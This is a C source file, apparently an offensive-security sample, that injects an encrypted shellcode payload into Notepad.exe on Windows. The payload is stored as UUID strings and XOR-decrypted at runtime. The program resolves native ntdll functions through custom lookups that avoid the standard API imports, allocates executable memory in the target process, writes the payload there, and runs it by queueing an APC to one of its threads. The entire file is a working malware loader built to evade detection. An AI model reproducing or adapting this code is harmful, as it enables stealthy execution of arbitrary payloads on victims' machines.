/* Cod3ed By 0xNinjaCyclone --> Greetz to Karim Nasser --> (19/12/2024) */

#include <Windows.h>
#include <TlHelp32.h>
#include <wchar.h>

#pragma comment (lib, "Rpcrt4.lib")

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define SHELLSIZE 0x114
#define KEYSIZE sizeof(pDecKey) - 1
#define KEY 0xd9

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef VOID(NTAPI* PIO_APC_ROUTINE)(
	_In_ PVOID ApcContext,
	_In_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_ ULONG Reserved);

extern HMODULE GetModuleHandleW2(LPCWCHAR);
extern PVOID GetProcAddress2(HMODULE, LPCCH);

typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
typedef NTSTATUS(WINAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(WINAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
typedef NTSTATUS(WINAPI* pNtOpenThread)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
typedef NTSTATUS(WINAPI* pNtQueueApcThread)(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine, PVOID ApcRoutineContext, PIO_STATUS_BLOCK ApcStatusBlock, ULONG ApcReserved);

HMODULE hNtdll;
pNtWriteVirtualMemory NtWriteVirtualMemory;
pNtAllocateVirtualMemory NtAllocateVirtualMemory;
pNtOpenThread NtOpenThread;
pNtOpenProcess NtOpenProcess;
pNtQueueApcThread NtQueueApcThread;

BYTE pDecKey[] = { 0xe9, 0xa1, 0x97, 0xb0, 0xb7, 0xb3, 0xb8, 0x9a, 0xa0, 0xba, 0xb5, 0xb6, 0xb7, 0xbc, 0x0 };

const char* uuids[] = {
		"8dcd30cc-829e-43a1-7963-2d3e2f356229",
		"b85f2118-0b04-31f2-0c27-e5372830c53b",
		"31ea224e-2b29-d863-242f-7d4987215faa",
		"1f187fcd-436e-244e-f1b1-43286fab83ae",
		"273d222b-37e5-f310-0c55-266bb1c8f9eb",
		"2d6e6f6c-b8b5-0e3a-266b-b113f22b742b",
		"311025e5-b94f-3c8d-29bc-b022e75be62d",
		"5803ae31-22a7-8350-d522-ada6632431b9",
		"9b1b8976-402d-4735-642a-57b445a0162d",
		"0a452ae5-b378-2e0a-e569-783cc5297223",
		"e8389360-e768-6426-e039-162836343819",
		"362d3b38-3f2f-fb78-a249-2f389ea32122",
		"ee263535-9122-9619-9195-3c0bc3626c6f",
		"7830656e-214e-e7e3-6042-79632dd55fee",
		"bcb1ff5f-9ad5-e1d4-2f22-d6c9fbd8ad87",
		"aeed219b-7f49-1f7f-66ef-9585457df52e",
		"290e187d-3a79-e62d-b49a-e51b2f050d44",
		"631c3b04-9090-9090-9090-909090909090"
};

BYTE pShellCode[SHELLSIZE];


DWORD Find_Target(LPCWCHAR pProcName) {
	HANDLE hSnap;
	PROCESSENTRY32 pe;
	DWORD dwProcId;

	dwProcId = -1;
	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap) {
		if (Process32First(hSnap, &pe))
			do {
				if (wcscmp(pe.szExeFile, pProcName) == 0) {
					dwProcId = pe.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnap, &pe));

		CloseHandle(hSnap);
	}

	return dwProcId;
}

BOOL Run(HANDLE hProc, DWORD dwProcId, POBJECT_ATTRIBUTES pOA, LPVOID pBuffer) {
	HANDLE hSnap, hHandle = NULL;
	THREADENTRY32 te;
	CLIENT_ID id;
	BOOL bSuccess;

	bSuccess = FALSE;
	te.dwSize = sizeof(THREADENTRY32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (hSnap) {
		if (Thread32First(hSnap, &te))
			do {
				if (te.th32OwnerProcessID == dwProcId) {
					id.UniqueProcess = (HANDLE)dwProcId;
					id.UniqueThread = (HANDLE)te.th32ThreadID;

					if (!NT_SUCCESS(NtOpenThread(&hHandle, THREAD_ALL_ACCESS, pOA, &id)))
						break;

					if (NT_SUCCESS(NtQueueApcThread(hHandle, (PAPCFUNC)pBuffer, pBuffer, NULL, NULL)))
						bSuccess = TRUE;

					break;
				}

			} while (Thread32Next(hSnap, &te));

		CloseHandle(hSnap);

		if (hHandle)
			CloseHandle(hHandle);
	}

LEAVE:

	return bSuccess;
}

int main(int argc, char** argv) {

	DWORD dwProcId;
	OBJECT_ATTRIBUTES oa = { 0 };
	CLIENT_ID ci;
	HANDLE hHandle = NULL;
	LPVOID pBuffer = NULL;
	SIZE_T ulShellSize = sizeof(pShellCode);
	INT nSuccess = EXIT_FAILURE;
	DWORD_PTR dwpShellCode;

	hNtdll = GetModuleHandleW2(L"ntdll");
	NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress2(hNtdll, "NtWriteVirtualMemory");
	NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress2(hNtdll, "NtAllocateVirtualMemory");
	NtOpenThread = (pNtOpenThread)GetProcAddress2(hNtdll, "NtOpenThread");
	NtOpenProcess = (pNtOpenProcess)GetProcAddress2(hNtdll, "NtOpenProcess");
	NtQueueApcThread = (pNtQueueApcThread)GetProcAddress2(hNtdll, "NtQueueApcThread");

	if (~(dwProcId = Find_Target(L"Notepad.exe"))) {
		dwpShellCode = (DWORD_PTR)pShellCode;

		for (INT nIdx = 0; nIdx < KEYSIZE; nIdx++)
			pDecKey[nIdx] ^= KEY;

		for (INT nIdx = 0; nIdx < sizeof(uuids) / sizeof(PCHAR); nIdx++) {
			if (UuidFromStringA((RPC_CSTR)uuids[nIdx], (UUID*)dwpShellCode) == RPC_S_INVALID_STRING_UUID)
				goto FAILURE;

			dwpShellCode += 0x10;
		}

		for (INT nIdx = 0, nCtr = 0; nIdx < SHELLSIZE; nIdx++) {
			nCtr = (nCtr == KEYSIZE) ? 0 : nCtr;
			pShellCode[nIdx] ^= pDecKey[nCtr++];
		}


		ci.UniqueProcess = (HANDLE)dwProcId;
		ci.UniqueThread = NULL;

		if (!NT_SUCCESS(NtOpenProcess(&hHandle, PROCESS_ALL_ACCESS, &oa, &ci)))
			goto FAILURE;

		if (!NT_SUCCESS(NtAllocateVirtualMemory(hHandle, &pBuffer, 0, &ulShellSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
			goto FAILURE;

		if (!NT_SUCCESS(NtWriteVirtualMemory(hHandle, pBuffer, pShellCode, ulShellSize, NULL)))
			goto FAILURE;

		if (Run(hHandle, dwProcId, &oa, pBuffer))
			nSuccess = EXIT_SUCCESS;
	}

FAILURE:
	if (hHandle)
		CloseHandle(hHandle);

	return nSuccess;
}